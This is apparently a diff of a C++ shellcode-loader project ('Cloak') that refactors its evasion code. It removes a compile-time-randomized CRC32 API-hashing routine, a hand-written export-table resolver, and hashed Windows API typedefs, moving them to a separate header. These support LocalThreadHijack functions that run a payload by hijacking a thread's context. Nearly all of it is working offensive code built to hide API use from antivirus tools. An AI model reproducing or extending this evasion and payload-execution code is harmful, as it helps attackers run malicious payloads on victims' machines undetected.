@@ -1,71 +1,7 @@
 #include "Cloak.hpp"
 
 #if defined(HASH_API) && ( defined(LOCAL_THREAD_HIJACK) || defined(LOCAL_THREAD_HIJACK_ENUM) )
-constexpr int RandomCompileTimeSeed(void)
-{
-	return '0' * -23784 +
-		__TIME__[7] * 345 +
-		__TIME__[6] * 12 +
-		__TIME__[4] * 2345123 +
-		__TIME__[3] * 623 +
-		__TIME__[1] * 95897 +
-		__TIME__[0] * 2;
-};
-
-constexpr auto g_KEY = RandomCompileTimeSeed() % RAND;
-
-constexpr DWORD HashStringCrc32(const char* String) {
-	UINT32      uMask	= 0x00;
-    UINT32      uHash	= g_KEY;
-	INT         i		= 0x00;
-
-	while ( String[i] != 0 ) {
-		uHash = uHash ^ ( UINT32 ) String[i];
-
-		for ( int ii = 0; ii < 8; ii++ ) {
-			uMask = -1 * ( uHash & 1 );
-			uHash = ( uHash >> 1 ) ^ ( 0xEDB88320 & uMask );
-		}
-
-		i++;
-	}
-
-	return ~uHash;
-}
-
-#define RTIME_HASHA( API ) HashStringCrc32( ( const char* ) API )
-#define CTIME_HASHA( API ) constexpr auto API##_CRC32A = HashStringCrc32( ( const char* ) #API );
-
-FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) {
-	PBYTE pBase = ( PBYTE ) hModule;
-
-	PIMAGE_DOS_HEADER   pImgDosHeader  = ( PIMAGE_DOS_HEADER ) pBase;
-	if ( pImgDosHeader->e_magic != IMAGE_DOS_SIGNATURE ) {
-        return NULL;
-    }
-
-	PIMAGE_NT_HEADERS   pImgNtHeaders  = ( PIMAGE_NT_HEADERS ) ( pBase + pImgDosHeader->e_lfanew );
-	if ( pImgNtHeaders->Signature != IMAGE_NT_SIGNATURE ) {
-		return NULL;
-    }
-
-	IMAGE_OPTIONAL_HEADER		ImgOptionalHeader		= pImgNtHeaders->OptionalHeader;
-	PIMAGE_EXPORT_DIRECTORY		pImgExportDirectory     = ( PIMAGE_EXPORT_DIRECTORY ) ( pBase + ImgOptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress );
-	PDWORD						pdwFunctionNameArray	= ( PDWORD ) ( pBase + pImgExportDirectory->AddressOfNames );
-	PDWORD						pdwFunctionAddressArray	= ( PDWORD ) ( pBase + pImgExportDirectory->AddressOfFunctions );
-	PWORD						pwFunctionOrdinalArray	= ( PWORD ) ( pBase + pImgExportDirectory->AddressOfNameOrdinals );
-
-	for ( DWORD i = 0; i < pImgExportDirectory->NumberOfFunctions; i++ ) {
-		CHAR*	pFunctionName		= ( CHAR* ) ( pBase + pdwFunctionNameArray[i] );
-		PVOID	pFunctionAddr   	= ( PVOID ) ( pBase + pdwFunctionAddressArray[pwFunctionOrdinalArray[i]] );
-
-		if ( dwApiNameHash == RTIME_HASHA( pFunctionName ) ) { 
-			return ( FARPROC ) pFunctionAddr;
-		}
-	}
-
-	return NULL;
-}
+#include "Hash.hpp"
 #endif // !HASH_API
 
 #ifdef LOCAL_THREAD_HIJACK
@@ -78,56 +14,6 @@ VOID GottaCatchEmAll() {
 }
 
 #ifdef HASH_API
-
-typedef HANDLE ( WINAPI * fnCreateThread ) (
-    LPSECURITY_ATTRIBUTES   lpThreadAttribute,
-    SIZE_T                  dwStackSize,
-    LPTHREAD_START_ROUTINE  lpStartAddress,
-    LPVOID                  lpParameter,
-    DWORD                   dwCreationFlags,
-    LPDWORD                 lpThreadId
-);
-
-typedef LPVOID ( WINAPI * fnVirtualAlloc ) (
-    LPVOID  lpAddress,
-    SIZE_T  dwSize,
-    DWORD   flAllocationType,
-    DWORD   flProtect
-);
-
-typedef BOOL ( WINAPI * fnVirtualProtect ) (
-    LPVOID  lpAddress,
-    SIZE_T  dwSize,
-    DWORD   flNewProtect,
-    PDWORD  lpflOldProtect
-);
-
-typedef BOOL ( WINAPI * fnGetThreadContext ) (
-    HANDLE      hThread,
-    LPCONTEXT   lpContext
-);
-
-typedef BOOL ( WINAPI * fnSetThreadContext ) (
-    HANDLE              hThread,
-    const CONTEXT       *lpContext
-);
-
-typedef DWORD ( WINAPI * fnResumeThread ) (
-    HANDLE  hThread
-);
-
-typedef DWORD ( WINAPI * fnWaitForSingleObject ) (
-    HANDLE  hHandle,
-    DWORD   dwMilliseconds
-);
-
-CTIME_HASHA(CreateThread)
-CTIME_HASHA(VirtualAlloc)
-CTIME_HASHA(VirtualProtect)
-CTIME_HASHA(GetThreadContext)
-CTIME_HASHA(SetThreadContext)
-CTIME_HASHA(ResumeThread)
-CTIME_HASHA(WaitForSingleObject)
 
 BOOL LocalThreadHijack(IN PBYTE pbPayload[], IN SIZE_T sPayloadSize) {
     
@@ -334,87 +220,6 @@ BOOL LocalThreadHijack(IN PBYTE pbPayload[], IN SIZE_T sPayloadSize) {
 #include <tlhelp32.h>
 
 #ifdef HASH_API
-
-typedef DWORD ( WINAPI * fnGetCurrentProcessId ) ();
-
-typedef DWORD ( WINAPI * fnGetCurrentThreadId ) ();
-
-typedef HANDLE ( WINAPI * fnCreateToolhelp32Snapshot) (
-    DWORD   dwFlags,
-    DWORD   th32ProcessId
-);
-
-typedef BOOL ( WINAPI * fnThread32First ) (
-    HANDLE          hSnapshot,
-    LPTHREADENTRY32 lpte
-);
-
-typedef BOOL ( WINAPI * fnCloseHandle ) (
-    HANDLE  hObject
-);
-
-typedef HANDLE ( WINAPI * fnOpenThread ) (
-    DWORD   dwDesiredAccess,
-    BOOL    bInheritHandle,
-    DWORD   dwThreadId
-);
-
-typedef BOOL ( WINAPI * fnThread32Next ) (
-    HANDLE          hSnapshot,
-    LPTHREADENTRY32 lpte
-);
-
-typedef LPVOID ( WINAPI * fnVirtualAlloc ) (
-    LPVOID  lpAddress,
-    SIZE_T  dwSize,
-    DWORD   flAllocationType,
-    DWORD   flProtect
-);
-
-typedef BOOL ( WINAPI * fnVirtualProtect ) (
-    LPVOID  lpAddress,
-    SIZE_T  dwSize,
-    DWORD   flNewProtect,
-    PDWORD  lpflOldProtect
-);
-
-typedef DWORD ( WINAPI * fnSuspendThread ) (
-    HANDLE  hThread
-);
-
-typedef BOOL ( WINAPI * fnGetThreadContext ) (
-    HANDLE      hThread,
-    LPCONTEXT   lpContext
-);
-
-typedef BOOL ( WINAPI * fnSetThreadContext ) (
-    HANDLE              hThread,
-    const CONTEXT       *lpContext
-);
-
-typedef DWORD ( WINAPI * fnResumeThread ) (
-    HANDLE  hThread
-);
-
-typedef DWORD ( WINAPI * fnWaitForSingleObject ) (
-    HANDLE  hHandle,
-    DWORD   dwMilliseconds
-);
-
-CTIME_HASHA(GetCurrentProcessId)
-CTIME_HASHA(GetCurrentThreadId)
-CTIME_HASHA(CreateToolhelp32Snapshot)
-CTIME_HASHA(Thread32First)
-CTIME_HASHA(CloseHandle)
-CTIME_HASHA(OpenThread)
-CTIME_HASHA(Thread32Next)
-CTIME_HASHA(VirtualAlloc)
-CTIME_HASHA(VirtualProtect)
-CTIME_HASHA(SuspendThread)
-CTIME_HASHA(GetThreadContext)
-CTIME_HASHA(SetThreadContext)
-CTIME_HASHA(ResumeThread)
-CTIME_HASHA(WaitForSingleObject)
 
 BOOL LocalThreadHijack(IN PBYTE pbPayload[], IN SIZE_T sPayloadSize) {
     
